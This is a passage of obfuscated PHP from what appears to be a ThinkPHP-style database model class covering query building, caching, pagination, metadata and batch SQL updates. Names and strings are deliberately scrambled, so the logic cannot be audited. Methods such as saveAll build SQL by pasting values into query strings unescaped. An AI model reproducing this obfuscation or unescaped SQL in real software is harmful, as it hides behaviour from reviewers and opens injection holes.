$this->setProperty($ÇÛ¥ë€Ò, $Ñê“ô„ı); } } $ñÏ¬•­[$Ğ‹…¤¡î] = $Î½Æ®ß­; $this->db = $Ş†İ‚Ï…[$Ğ‹…¤¡î]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ä‰®º… = get_class($this); if ($ä‰®º… == $_SERVER[³½¬ÚË¯][390]) { return $this->name; } $this->name = substr($ä‰®º…, 0, -5); } return $this->name; } public function getTableName() { $ªâ²ö•½ =& $_SERVER[³½¬ÚË¯]; if (empty($this->trueTableName)) { $¬â¯Ü†ñ = !empty($this->tablePrefix) ? $this->tablePrefix : $ªâ²ö•½[12]; if (!empty($this->tableName)) { $¬â¯Ü†ñ .= $this->tableName; } else { $¬â¯Ü†ñ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¬â¯Ü†ñ); } return (!empty($this->dbName) ? $this->dbName . $ªâ²ö•½[10] : $ªâ²ö•½[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $£Ä›¬ş¯ =& $_SERVER[³½¬ÚË¯]; return isset($this->fields[$£Ä›¬ş¯[295]]) ? $this->fields[$£Ä›¬ş¯[295]] : $this->pk; } public function getDbFields() { $ıÀÖ“«€ =& $_SERVER[³½¬ÚË¯]; if (isset($this->options[$ıÀÖ“«€[323]])) { $—ÔäÇŒ = $this->db->getFields($this->options[$ıÀÖ“«€[323]]); return $—ÔäÇŒ ? array_keys($—ÔäÇŒ) : !1; } if ($this->fields) { $—ÔäÇŒ = $this->fields; unset($—ÔäÇŒ[$ıÀÖ“«€[294]], $—ÔäÇŒ[$ıÀÖ“«€[295]], $—ÔäÇŒ[$ıÀÖ“«€[296]], $—ÔäÇŒ[$ıÀÖ“«€[293]]); return $—ÔäÇŒ; } return !1; } public function data($Ş¯ËÚ¢à = '') { $¶ä¾…¤Â =& $_SERVER[³½¬ÚË¯]; if ($¶ä¾…¤Â[12] === $Ş¯ËÚ¢à && !empty($this->data)) { return $this->data; } if (is_object($Ş¯ËÚ¢à)) { $Ş¯ËÚ¢à = get_object_vars($Ş¯ËÚ¢à); } elseif (is_string($Ş¯ËÚ¢à)) { parse_str($Ş¯ËÚ¢à, $Ş¯ËÚ¢à); } elseif (!is_array($Ş¯ËÚ¢à)) { think_exception(think_lang($¶ä¾…¤Â[315])); } $this->data = $Ş¯ËÚ¢à; return $this; } public function join($ÑÄ·è¤à) { $³„Ö˜’” =& $_SERVER[³½¬ÚË¯]; if (is_array($ÑÄ·è¤à)) { $this->options[$³„Ö˜’”[326]] = $ÑÄ·è¤à; } elseif (!empty($ÑÄ·è¤à)) { $this->options[$³„Ö˜’”[326]][] = $ÑÄ·è¤à; } return $this; } public function union($ÖÓÈøá, $ÚÔ–Ã„ = false) { $è¤ŞïÏ =& $_SERVER[³½¬ÚË¯]; if (empty($ÖÓÈøá)) { return $this; } if ($ÚÔ–Ã„) { $this->options[$è¤ŞïÏ[391]][$è¤ŞïÏ[392]] = !0; } if (is_object($ÖÓÈøá)) { $ÖÓÈøá = get_object_vars($ÖÓÈøá); } if (is_string($ÖÓÈøá)) { $ŒÁúÓµŞ = $ÖÓÈøá; } elseif (is_array($ÖÓÈøá)) { if (isset($ÖÓÈøá[0])) { $this->options[$è¤ŞïÏ[391]] = array_merge($this->options[$è¤ŞïÏ[391]], $ÖÓÈøá); return $this; } else { $ŒÁúÓµŞ = $ÖÓÈøá; } } else { think_exception(think_lang($è¤ŞïÏ[315])); } $this->options[$è¤ŞïÏ[391]][] = $ŒÁúÓµŞ; return $this; } public function cache($„­¯“ÒÍ = true, $‰Ù˜”Ï = null, $¥†±”¨ = '') { $Ãúˆˆ¡¡ =& $_SERVER[³½¬ÚË¯]; if (!1 !== $„­¯“ÒÍ) { $this->options[$Ãúˆˆ¡¡[393]] = array($Ãúˆˆ¡¡[94] => $„­¯“ÒÍ, $Ãúˆˆ¡¡[383] => $‰Ù˜”Ï, $Ãúˆˆ¡¡[33] => $¥†±”¨); } return $this; } public function field($™à‚„‚º, $ù¶ç¸Æó = false) { $¢¨ĞäÍµ =& $_SERVER[³½¬ÚË¯]; if (!0 === $™à‚„‚º) { $¢«²¾ëå = $this->getDbFields(); $™à‚„‚º = $¢«²¾ëå ? $¢«²¾ëå : $¢¨ĞäÍµ[203]; } elseif ($ù¶ç¸Æó) { if (is_string($™à‚„‚º)) { $™à‚„‚º = explode($¢¨ĞäÍµ[50], $™à‚„‚º); } $¢«²¾ëå = $this->getDbFields(); $™à‚„‚º = $¢«²¾ëå ? array_diff($¢«²¾ëå, $™à‚„‚º) : $™à‚„‚º; } $this->options[$¢¨ĞäÍµ[317]] = $™à‚„‚º; return $this; } public function scope($–ûÇî¼Á = '', $„öØÀª¿ = NULL) { $åÊØïêè =& $_SERVER[³½¬ÚË¯]; if ($åÊØïêè[12] === $–ûÇî¼Á) { if (isset($this->_scope[$åÊØïêè[37]])) { $éæÉûÏì = $this->_scope[$åÊØïêè[37]]; } else { return $this; } } elseif (is_string($–ûÇî¼Á)) { $èóà€Ä = explode($åÊØïêè[50], $–ûÇî¼Á); $éæÉûÏì = array(); foreach ($èóà€Ä as $º²Ã©Çˆ) { if (!isset($this->_scope[$º²Ã©Çˆ])) { continue; } $éæÉûÏì = array_merge($éæÉûÏì, $this->_scope[$º²Ã©Çˆ]); } if (!empty($„öØÀª¿) && is_array($„öØÀª¿)) { $éæÉûÏì = array_merge($éæÉûÏì, $„öØÀª¿); } } elseif (is_array($–ûÇî¼Á)) { $éæÉûÏì = $–ûÇî¼Á; } if (is_array($éæÉûÏì) && !empty($éæÉûÏì)) { $this->options = array_merge($this->options, array_change_key_case($éæÉûÏì)); } return $this; } public function where($‡Ä¹´¶â, $©±™Îˆ = null) { $ÃÌªÄ—æ =& $_SERVER[³½¬ÚË¯]; if (!is_null($©±™Îˆ) && is_string($‡Ä¹´¶â)) { if (!is_array($©±™Îˆ)) { $©±™Îˆ = func_get_args(); array_shift($©±™Îˆ); } $©±™Îˆ = array_map(array($this->db, $ÃÌªÄ—æ[387]), $©±™Îˆ); $‡Ä¹´¶â = vsprintf($‡Ä¹´¶â, $©±™Îˆ); } elseif (is_object($‡Ä¹´¶â)) { $‡Ä¹´¶â = get_object_vars($‡Ä¹´¶â); } elseif (is_array($‡Ä¹´¶â)) { foreach ($‡Ä¹´¶â as $¾èª¬ûñ => $€•Ì¸‘û) { if ((is_numeric($¾èª¬ûñ) || !$¾èª¬ûñ) && is_string($€•Ì¸‘û)) { if (strpos($€•Ì¸‘û, $ÃÌªÄ—æ[394]) === 0) { continue; } think_trace($ÃÌªÄ—æ[395], $ÃÌªÄ—æ[12], $ÃÌªÄ—æ[49]); die; } } } if (is_string($‡Ä¹´¶â) && $ÃÌªÄ—æ[12] != $‡Ä¹´¶â) { $ŸÄµİ”¥ = array(); $ŸÄµİ”¥[$ÃÌªÄ—æ[396]] = $‡Ä¹´¶â; $‡Ä¹´¶â = $ŸÄµİ”¥; } if (isset($this->options[$ÃÌªÄ—æ[319]])) { $this->options[$ÃÌªÄ—æ[319]] = array_merge($this->options[$ÃÌªÄ—æ[319]], $‡Ä¹´¶â); } else { $this->options[$ÃÌªÄ—æ[319]] = $‡Ä¹´¶â; } return $this; } public function limit($¾ñÚ—§§, $¸ÚØá§² = null) { $„¼Å¬ä =& $_SERVER[³½¬ÚË¯]; $this->options[$„¼Å¬ä[336]] = is_null($¸ÚØá§²) ? $¾ñÚ—§§ : $¾ñÚ—§§ . $„¼Å¬ä[50] . $¸ÚØá§²; return $this; } public function page($›«¥è«, $‡Œıš¢› = null) { $óé¡İ¥É =& $_SERVER[³½¬ÚË¯]; $this->options[$óé¡İ¥É[397]] = is_null($‡Œıš¢›) ? $›«¥è« : $›«¥è« . $óé¡İ¥É[50] . $‡Œıš¢›; return $this; } public function comment($ óê£¾) { $this->options[$_SERVER[³½¬ÚË¯][398]] = $ óê£¾; return $this; } public function setProperty($ğ«›¶¹, $àÔ‘‘„é) { if (property_exists($this, $ğ«›¶¹)) { $this->{$ğ«›¶¹} = $àÔ‘‘„é; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\171\124\x69\155\145", "\164\x69\155\145", "\151\x6e\x73\x65\162\164\54\x75\x70\144\141\x74\145", "\x66\x75\156\x63\164\151\x6f\156"), array("\x63\x72\x65\x61\x74\x65\124\151\155\145", "\164\151\x6d\145", "\x69\x6e\163\x65\162\x74", "\x66\165\156\143\x74\x69\157\156")); public function setDataAuto($³Ğ–ñÁ¯) { $this->dataAuto = $³Ğ–ñÁ¯; } public function __construct($Ãù‹¬¸á = '', $è‡âö¨á = '', $àÂ¥‚éö = '') { parent::__construct($Ãù‹¬¸á, $è‡âö¨á, $àÂ¥‚éö); } protected $tableMeta = array(); protected function _beforeInsert(&$ª¬›Ÿ™, $Æ¥®»†) { $ÒÌ¹ïË =& $_SERVER[³½¬ÚË¯]; if (!$this->checkDataAutoHas($ÒÌ¹ïË[399])) { return; } $this->dataBeforeFilter($ª¬›Ÿ™, $ÒÌ¹ïË[399]); } protected function _beforeUpdate(&$˜µÆı›ö, $‹°ÃÖæ ) { $¸ñŸ•†¦ =& $_SERVER[³½¬ÚË¯]; if (!$this->checkDataAutoHas($¸ñŸ•†¦[400])) { return; } $this->dataBeforeFilter($˜µÆı›ö, $¸ñŸ•†¦[400]); } protected function _afterSelect(&$¹ıîÅ· , $Œ£Î…•) { if (!is_array($¹ıîÅ· )) { return; } if (!$this->checkDataAutoHas($_SERVER[³½¬ÚË¯][401])) { return; } foreach ($¹ıîÅ·  as &$äØú¥ĞÛ) { $this->dataAfterFilter($äØú¥ĞÛ); } unset($äØú¥ĞÛ); } protected function _afterFind(&$ŒÂı¼òğ, $™Œ¦Å€) { if (!is_array($ŒÂı¼òğ)) { return; } if (!$this->checkDataAutoHas($_SERVER[³½¬ÚË¯][401])) { return; } $this->dataAfterFilter($ŒÂı¼òğ); } public static function textEncode($»õöí˜) { if (!$»õöí˜) { return $»õöí˜; } $‰“ÏÛ¨— = json_encode($»õöí˜); $‰“ÏÛ¨— = preg_replace_callback($_SERVER[³½¬ÚË¯][402], function ($¹Ôö†ã†) { return addslashes($¹Ôö†ã†[0]); }, $‰“ÏÛ¨—); return json_decode($‰“ÏÛ¨—); } public static function textDecode($†Âæó¢) { $€ÙÜ°¸ =& $_SERVER[³½¬ÚË¯]; $ÛùÃâòÔ = json_encode($†Âæó¢); $ÛùÃâòÔ = preg_replace_callback($€ÙÜ°¸[403], function ($âÇÖü­à) { return $_SERVER[³½¬ÚË¯][97]; }, $ÛùÃâòÔ); return json_decode($ÛùÃâòÔ); } public function setAutoIncrement($Ñ“øÄ¸”) { $—…ª¼ÆÒ = array($this->getPk() => $Ñ“øÄ¸”); $Š­—ûÔù = $this->data($—…ª¼ÆÒ)->add(); if ($Š­—ûÔù) { $this->delete($Š­—ûÔù); } } public function getAutoIncrement() { $Ò¸ç”¶ = $this->getTableName(); $òë’ÚíÜ = $this->max($this->getPk()); $¡îãî£ = $this->query("\163\x68\x6f\167\40\x74\x61\x62\154\145\x20\163\164\141\164\165\163\40\x77\150\145\x72\x65\40\116\141\x6d\x65\75\x27{$Ò¸ç”¶}\x27"); $Ê¼°„”– = $¡îãî£[0][$_SERVER[³½¬ÚË¯][404]]; $Šš»ÜãŠ = max($òë’ÚíÜ, $Ê¼°„”–); return $Šš»ÜãŠ; } protected function _callBefore($ú¯­ÉÌå, $û£ø¡œ‚) { return $this->cacheCallCheck($ú¯­ÉÌå, $û£ø¡œ‚, !1); } protected function _callAfter($Å×”¶ùÔ, $åõúÇèô) { return $this->cacheCallCheck($Å×”¶ùÔ, $åõúÇèô, !0); } protected function cacheFunctionAlias($¤À•Ùı) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ñÎù§¾Ê, $ŒÓÂşÎ, $§À Éé = false) { $¬±¬©‰ƒ = $this->cacheFunctionAlias($ŒÓÂşÎ); if (!$¬±¬©‰ƒ) { return; } foreach ($¬±¬©‰ƒ as $­´ÅÍïÍ => $Ë»Û§Àü) { $ˆ³­¸‚Ó = $Ë»Û§Àü[0]; $•èô’û = explode($_SERVER[³½¬ÚË¯][50], $Ë»Û§Àü[1]); if ($ñÎù§¾Ê == $­´ÅÍïÍ) { return $this->cacheFunctionGet($­´ÅÍïÍ, $ˆ³­¸‚Ó); } if ($§À Éé && in_array($ñÎù§¾Ê, $•èô’û)) { $this->cacheFunctionClear($­´ÅÍïÍ, $ˆ³­¸‚Ó); } } } public function cacheFunctionGet($÷²öï¯Õ, $ÎÒö™«è) { $íü¦Ëø = $this->cacheKeyMake($÷²öï¯Õ, $ÎÒö™«è); $ƒÒó×«‹ = Cache::get($íü¦Ëø); if (!is_array($ƒÒó×«‹)) { $ƒÒó×«‹ = call_user_func_array(array($this, $÷²öï¯Õ), array($ÎÒö™«è, !0)); Cache::set($íü¦Ëø, $ƒÒó×«‹); } return $ƒÒó×«‹; } public function cacheFunctionClear($¹˜êºÈª, $ƒÍ¤¿ÑÇ) { $Ã««²ç° = $ƒÍ¤¿ÑÇ; if (!is_array($ƒÍ¤¿ÑÇ)) { $Ã««²ç° = array($ƒÍ¤¿ÑÇ); } foreach ($Ã««²ç° as $‹Çö¨ ) { $ß˜œÜ™ = $this->cacheKeyMake($¹˜êºÈª, $‹Çö¨ ); Cache::remove($ß˜œÜ™); } } private function cacheKeyMake($êíæ‚í’, $‡§úùƒ) { $š×™ÔÃ‚ =& $_SERVER[³½¬ÚË¯]; return get_class($this) . $š×™ÔÃ‚[11] . $êíæ‚í’ . $š×™ÔÃ‚[405] . $‡§úùƒ; } protected function selectPageReset() { $©ÂÇêË =& $_SERVER[³½¬ÚË¯]; if (isset($GLOBALS[$©ÂÇêË[406]])) { return; } $GLOBALS[$©ÂÇêË[406]] = isset($GLOBALS[$©ÂÇêË[7]][$©ÂÇêË[407]]) ? $GLOBALS[$©ÂÇêË[7]][$©ÂÇêË[407]] : !1; $GLOBALS[$©ÂÇêË[408]] = isset($GLOBALS[$©ÂÇêË[7]][$©ÂÇêË[397]]) ? $GLOBALS[$©ÂÇêË[7]][$©ÂÇêË[397]] : !1; $GLOBALS[$©ÂÇêË[7]][$©ÂÇêË[407]] = !1; $GLOBALS[$©ÂÇêË[7]][$©ÂÇêË[397]] = !1; } protected function selectPageRestore() { $¡¿‰ªë÷ =& $_SERVER[³½¬ÚË¯]; if (!isset($GLOBALS[$¡¿‰ªë÷[406]])) { return; } $GLOBALS[$¡¿‰ªë÷[7]][$¡¿‰ªë÷[407]] = $GLOBALS[$¡¿‰ªë÷[406]]; $GLOBALS[$¡¿‰ªë÷[7]][$¡¿‰ªë÷[397]] = $GLOBALS[$¡¿‰ªë÷[408]]; if ($GLOBALS[$¡¿‰ªë÷[7]][$¡¿‰ªë÷[407]] === !1) { unset($GLOBALS[$¡¿‰ªë÷[7]][$¡¿‰ªë÷[407]]); } if ($GLOBALS[$¡¿‰ªë÷[7]][$¡¿‰ªë÷[397]] === !1) { unset($GLOBALS[$¡¿‰ªë÷[7]][$¡¿‰ªë÷[397]]); } unset($GLOBALS[$¡¿‰ªë÷[406]]); unset($GLOBALS[$¡¿‰ªë÷[408]]); } protected function selectPage($Ñ¡âûü = 200, $ÎÒø½ = 1) { $»¤æ€ö› =& $_SERVER[³½¬ÚË¯]; global $in; $ÕÓª¹¬ = $this->optionsValue(); $úÜÏ´ë­ = 50000; $Ñ¡âûü = isset($in[$»¤æ€ö›[407]]) && $in[$»¤æ€ö›[407]] ? $in[$»¤æ€ö›[407]] : $Ñ¡âûü; if ($Ñ¡âûü === -1) { $in[$»¤æ€ö›[407]] = !1; $úÜÏ´ë­ = 100000000; $Ñ¡âûü = $úÜÏ´ë­; } $œ••öÕË = $ÕÓª¹¬; $œ••öÕË[$»¤æ€ö›[409]] = array(); $Ñ¡âûü = intval($Ñ¡âûü); $Ñ¡âûü = $Ñ¡âûü <= 5 ? 5 : ($Ñ¡âûü >= $úÜÏ´ë­ ? $úÜÏ´ë­ : $Ñ¡âûü); $ÎÒø½ = intval(isset($in[$»¤æ€ö›[397]]) && $in[$»¤æ€ö›[397]] ? $in[$»¤æ€ö›[397]] : $ÎÒø½); $ÎÒø½ = $ÎÒø½ <= 1 ? 1 : $ÎÒø½; $ÆÄï¹¡À = array(); $—şçÌ¤ç = 1; if ($ÎÒø½ == 1 && $—şçÌ¤ç) { $this->optionsValue($ÕÓª¹¬); $ÆÄï¹¡À = $this->page($ÎÒø½, $Ñ¡âûü)->select(); $ñãó¼è¡ = is_array($ÆÄï¹¡À) ? count($ÆÄï¹¡À) : 0; if ($ñãó¼è¡ < $Ñ¡âûü) { $ÎÅÈ¶›æ = 1; } else { $this->optionsValue($œ••öÕË); $ñãó¼è¡ = intval($this->count()); $ÎÅÈ¶›æ = ceil($ñãó¼è¡ / $Ñ¡âûü); } } else { $this->optionsValue($œ••öÕË); $ñãó¼è¡ = intval($this->count()); $ÎÅÈ¶›æ = ceil($ñãó¼è¡ / $Ñ¡âûü); $ÎÒø½ = $ÎÒø½ >= $ÎÅÈ¶›æ ? $ÎÅÈ¶›æ : $ÎÒø½; $this->optionsValue($ÕÓª¹¬); $ÆÄï¹¡À = $this->page($ÎÒø½, $Ñ¡âûü)->select(); } if (!is_array($ÆÄï¹¡À)) { $ÆÄï¹¡À = array(); } if ($ÎÅÈ¶›æ == 1) { $ñãó¼è¡ = count($ÆÄï¹¡À); } $¿²„¥Šã = array($»¤æ€ö›[410] => array($»¤æ€ö›[411] => $ñãó¼è¡, $»¤æ€ö›[407] => $Ñ¡âûü, $»¤æ€ö›[397] => $ÎÒø½, $»¤æ€ö›[412] => $ÎÅÈ¶›æ), $»¤æ€ö›[413] => $ÆÄï¹¡À); return $¿²„¥Šã; } protected function checkLength($ç“³¸Ï‡, $×ÙøÕµœ = 0, $’š€£ó = '') { $Á™™ğÉ =& $_SERVER[³½¬ÚË¯]; $×ÙøÕµœ = $×ÙøÕµœ ? $×ÙøÕµœ : 65536; if (!$ç“³¸Ï‡ || strlen($ç“³¸Ï‡) < $×ÙøÕµœ) { return; } $’š€£ó = $’š€£ó ? $’š€£ó . $Á™™ğÉ[71] : $Á™™ğÉ[12]; show_json($’š€£ó . LNG($Á™™ğÉ[414]) . "\50{$×ÙøÕµœ}\x29", !1); } protected function metaSet($ç‘Ïì‰, $ÊÁÑ™øö = null, $¬Èşäè = null) { $Äğ‚Í =& $_SERVER[³½¬ÚË¯]; if (!$this->tableMeta || !$ç‘Ïì‰) { return !1; } $‡‰²¿Å÷ = $this->tableMeta[$Äğ‚Í[415]]; $í»Š«ĞÛ = $this->tableMeta[$Äğ‚Í[416]]; $ÍØşØ¹® = Model($í»Š«ĞÛ); $´š¸ÏÏ = array($‡‰²¿Å÷ => $ç‘Ïì‰, $Äğ‚Í[417] => $ÊÁÑ™øö); if (is_null($ÊÁÑ™øö)) { return $ÍØşØ¹®->where(array($‡‰²¿Å÷ => $ç‘Ïì‰))->delete(); } if (is_null($¬Èşäè) && is_string($ÊÁÑ™øö)) { return $ÍØşØ¹®->where($´š¸ÏÏ)->delete(); } $€ƒ’Â†Á = is_array($ÊÁÑ™øö) ? $ÊÁÑ™øö : array(); if (is_string($ÊÁÑ™øö)) { $€ƒ’Â†Á[$ÊÁÑ™øö] = $¬Èşäè; } $óÌ¡ºß¯ = array(); foreach ($€ƒ’Â†Á as $Ìœµ­¶ => $â‚†Øâ÷) { if (is_null($â‚†Øâ÷) && is_string($Ìœµ­¶)) { $ÍØşØ¹®->where(array($‡‰²¿Å÷ => $ç‘Ïì‰, $Äğ‚Í[417] => $Ìœµ­¶))->delete(); continue; } $this->checkLength($â‚†Øâ÷, !1, $í»Š«ĞÛ . $Äğ‚Í[4] . $Ìœµ­¶); $óÌ¡ºß¯[] = array($‡‰²¿Å÷ => $ç‘Ïì‰, $Äğ‚Í[94] => $Ìœµ­¶, $Äğ‚Í[418] => $â‚†Øâ÷); } $Ë¡ã‹ºÊ = $Äğ‚Í[419] . $í»Š«ĞÛ; CacheLock::lock($Ë¡ã‹ºÊ); $ÍØşØ¹®->where(array($‡‰²¿Å÷ => $ç‘Ïì‰))->addAll($óÌ¡ºß¯, array(), !0); CacheLock::unlock($Ë¡ã‹ºÊ); return !0; } public function metaGet($Ù´É‡˜ƒ, $«ò­Ô–µ = false) { $ÎåöÔÆ =& $_SERVER[³½¬ÚË¯]; if (!$this->tableMeta) { return array(); } $ç³ÀÌÕ’ = $this->tableMeta[$ÎåöÔÆ[415]]; $ƒ›ëòÑ’ = Model($this->tableMeta[$ÎåöÔÆ[416]]); if ($«ò­Ô–µ) { $šæùİèš = array($ç³ÀÌÕ’ => $Ù´É‡˜ƒ, $ÎåöÔÆ[94] => $«ò­Ô–µ); return $ƒ›ëòÑ’->where($šæùİèš)->getField($ÎåöÔÆ[418]); } $šæùİèš = array($ç³ÀÌÕ’ => $Ù´É‡˜ƒ); $¢ÍñäÕå = $ƒ›ëòÑ’->field($ÎåöÔÆ[420])->where($šæùİèš)->select(); $¢ÍñäÕå = array_to_keyvalue($¢ÍñäÕå, $ÎåöÔÆ[94], $ÎåöÔÆ[418]); return $¢ÍñäÕå; } private function checkDataAutoHas($ÕıÒı‰) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ºŞäÎ) { if (in_array($ÕıÒı‰, explode($_SERVER[³½¬ÚË¯][50], $ºŞäÎ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Õ˜¼Õõí, $èÑÑ§÷Ã) { $ˆ„Ìü×İ =& $_SERVER[³½¬ÚË¯]; if (!is_array($Õ˜¼Õõí)) { return; } foreach ($this->dataAuto as $€”øìÂ×) { $Î†¢ = $€”øìÂ×[0]; if (!in_array($èÑÑ§÷Ã, explode($ˆ„Ìü×İ[50], $€”øìÂ×[2]))) { continue; } switch (trim($€”øìÂ×[3])) { case $ˆ„Ìü×İ[365]: case $ˆ„Ìü×İ[366]: $…ÖÖ­àˆ = $€”øìÂ×[1]; $«¬Äà¦« = isset($€”øìÂ×[4]) ? (array) $€”øìÂ×[4] : array(); if ($…ÖÖ­àˆ == $ˆ„Ìü×İ[194] && array_key_exists($Î†¢, $Õ˜¼Õõí)) { if (!$Õ˜¼Õõí[$Î†¢]) { unset($Õ˜¼Õõí[$Î†¢]); } break; } if (isset($Õ˜¼Õõí[$Î†¢])) { array_unshift($«¬Äà¦«, $Õ˜¼Õõí[$Î†¢]); } if ($ˆ„Ìü×İ[365] == $€”øìÂ×[3]) { $Õ˜¼Õõí[$Î†¢] = call_user_func_array($…ÖÖ­àˆ, $«¬Äà¦«); } else { $Õ˜¼Õõí[$Î†¢] = call_user_func_array(array(&$this, $…ÖÖ­àˆ), $«¬Äà¦«); } break; case $ˆ„Ìü×İ[314]: if (isset($Õ˜¼Õõí[$Î†¢]) && $Õ˜¼Õõí[$Î†¢]) { $Õ˜¼Õõí[$Î†¢] = call_user_func_array(array(&$this, $€”øìÂ×[1]), array($Õ˜¼Õõí[$Î†¢])); } break; case $ˆ„Ìü×İ[317]: $Õ˜¼Õõí[$Î†¢] = $Õ˜¼Õõí[$€”øìÂ×[1]]; break; case $ˆ„Ìü×İ[338]: if (isset($Õ˜¼Õõí[$Î†¢]) && !is_string($Õ˜¼Õõí[$Î†¢])) { $Õ˜¼Õõí[$Î†¢] = json_encode_force($Õ˜¼Õõí[$Î†¢]); } break; case $ˆ„Ìü×İ[367]: if ($Õ˜¼Õõí[$Î†¢] === $ˆ„Ìü×İ[12]) { unset($Õ˜¼Õõí[$Î†¢]); } break; case $ˆ„Ìü×İ[368]: $Õ˜¼Õõí[$Î†¢] = $€”øìÂ×[1]; default: break; } } if ($èÑÑ§÷Ã == $ˆ„Ìü×İ[399]) { $é˜Î¸íö = strtolower($this->db->getDbType()); if (strpos($é˜Î¸íö, $ˆ„Ìü×İ[13]) !== 0) { return; } $ŞéíÊ¹ú = $this->field(!0)->fields; $øº€ÃË° = $ŞéíÊ¹ú[$ˆ„Ìü×İ[296]]; if (isset($ŞéíÊ¹ú[$ˆ„Ìü×İ[295]])) { unset($øº€ÃË°[$ŞéíÊ¹ú[$ˆ„Ìü×İ[295]]]); } foreach ($øº€ÃË° as $ÂÅ·÷Ô => $èÑÑ§÷Ã) { if (!isset($Õ˜¼Õõí[$ÂÅ·÷Ô])) { $Õ˜¼Õõí[$ÂÅ·÷Ô] = $ˆ„Ìü×İ[12]; } } } } private function dataAfterFilter(&$½ê¤­Éô) { $–ÇÑ»µ =& $_SERVER[³½¬ÚË¯]; foreach ($this->dataAuto as $ü¯Ã¸è) { $èÙÖºº‹ = $ü¯Ã¸è[0]; if (!isset($½ê¤­Éô[$èÙÖºº‹])) { continue; } if (!in_array($–ÇÑ»µ[401], explode($–ÇÑ»µ[50], $ü¯Ã¸è[2]))) { continue; } switch (trim($ü¯Ã¸è[3])) { case $–ÇÑ»µ[365]: case $–ÇÑ»µ[366]: $ò¾ µÍ = isset($ü¯Ã¸è[4]) ? (array) $ü¯Ã¸è[4] : array(); array_unshift($ò¾ µÍ, $½ê¤­Éô[$èÙÖºº‹]); if (isset($ü¯Ã¸è[4]) && $ü¯Ã¸è[4] == $–ÇÑ»µ[421]) { $ò¾ µÍ = array($½ê¤­Éô[$èÙÖºº‹]); } if ($–ÇÑ»µ[365] == $ü¯Ã¸è[3]) { $½ê¤­Éô[$èÙÖºº‹] = call_user_func_array($ü¯Ã¸è[1], $ò¾ µÍ); } else { $½ê¤­Éô[$èÙÖºº‹] = call_user_func_array(array(&$this, $ü¯Ã¸è[1]), $ò¾ µÍ); } break; case $–ÇÑ»µ[314]: if (isset($½ê¤­Éô[$èÙÖºº‹]) && $½ê¤­Éô[$èÙÖºº‹]) { $½ê¤­Éô[$èÙÖºº‹] = call_user_func_array(array(&$this, $ü¯Ã¸è[1]), array($½ê¤­Éô[$èÙÖºº‹])); } break; case $–ÇÑ»µ[317]: $½ê¤­Éô[$èÙÖºº‹] = $½ê¤­Éô[$ü¯Ã¸è[1]]; break; case $–ÇÑ»µ[338]: $½¸²°Ş‹ = $½ê¤­Éô[$èÙÖºº‹]; $½ê¤­Éô[$èÙÖºº‹] = json_decode($½¸²°Ş‹, !0); if (is_null($½ê¤­Éô[$èÙÖºº‹])) { $½ê¤­Éô[$èÙÖºº‹] = $½¸²°Ş‹; } break; case $–ÇÑ»µ[367]: if ($½ê¤­Éô[$èÙÖºº‹] === $–ÇÑ»µ[12]) { unset($½ê¤­Éô[$èÙÖºº‹]); } break; case $–ÇÑ»µ[368]: $½ê¤­Éô[$èÙÖºº‹] = $ü¯Ã¸è[1]; break; default: break; } } } public function saveAll($›í”ÜØ) { $’ã²öŒ€ =& $_SERVER[³½¬ÚË¯]; $…ûĞı…¥ = $this->tablePrefix . $this->tableName; $Âî±¹‰¶ = self::SQL_WHERE_IN_CHUNK; $›í”ÜØ = is_array($›í”ÜØ) ? $›í”ÜØ : array(); $¼ùÁØ = $’ã²öŒ€[422]; $®®÷ˆ¡ş = 0; $×İêÆ×ê = array(); $Úõ»ü¢ö = count($›í”ÜØ); for ($Ñ°¾¤ˆ = 0; $Ñ°¾¤ˆ < $Úõ»ü¢ö; $Ñ°¾¤ˆ++) { $œ¯Ñ÷åÃ = $›í”ÜØ[$Ñ°¾¤ˆ]; if (!is_array($œ¯Ñ÷åÃ) || count($œ¯Ñ÷åÃ) != 4) { continue; } $æÄÙüä = "\x55\120\104\101\124\x45\40\140{$…ûĞı…¥}\140\x20\123\105\x54\40{$œ¯Ñ÷åÃ[2]}\40\x3d\40\103\x41\x53\105\40{$œ¯Ñ÷åÃ[0]}\40\12"; if ($®®÷ˆ¡ş == 0) { $¼ùÁØ = $æÄÙüä; } $×İêÆ×ê[] = $’ã²öŒ€[118] . $œ¯Ñ÷åÃ[1] . $’ã²öŒ€[118]; $®®÷ˆ¡ş++; $¼ùÁØ .= "\x20\x57\110\105\116\40\47{$œ¯Ñ÷åÃ[1]}\47\40\124\110\105\x4e\x20\x27{$œ¯Ñ÷åÃ[3]}\x27\40\xa"; if ($®®÷ˆ¡ş == $Âî±¹‰¶ || $Ñ°¾¤ˆ == $Úõ»ü¢ö - 1) { $…§¯®ë = implode($’ã²öŒ€[50], $×İêÆ×ê); $¼ùÁØ .= "\40\105\116\x44\x20\40\x57\110\105\x52\105\40{$œ¯Ñ÷åÃ[0]}\40\111\116\40\50{$…§¯®ë}\x29\x20"; $this->execute($¼ùÁØ); $®®÷ˆ¡ş = 0; $¼ùÁØ = $æÄÙüä; $this->chunkEventCheck(count($×İêÆ×ê)); $×İêÆ×ê = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÕŒŞ£Ä) { $¥ùÁëßÆ =& $_SERVER[³½¬ÚË¯]; $­Ğø‹ãş = $this->tablePrefix . $this->tableName; foreach ($ÕŒŞ£Ä as $Ü¾İæ‰ñ) { if (!is_array($Ü¾İæ‰ñ) || count($Ü¾İæ‰ñ) != 4) { continue; } $¥ÀÀŠ²¶ = $Ü¾İæ‰ñ[0] . $¥ùÁëßÆ[423] . $Ü¾İæ‰ñ[1] . $¥ùÁëßÆ[118]; $Èšà’›¼ = $Ü¾İæ‰ñ[2] . $¥ùÁëßÆ[423] . 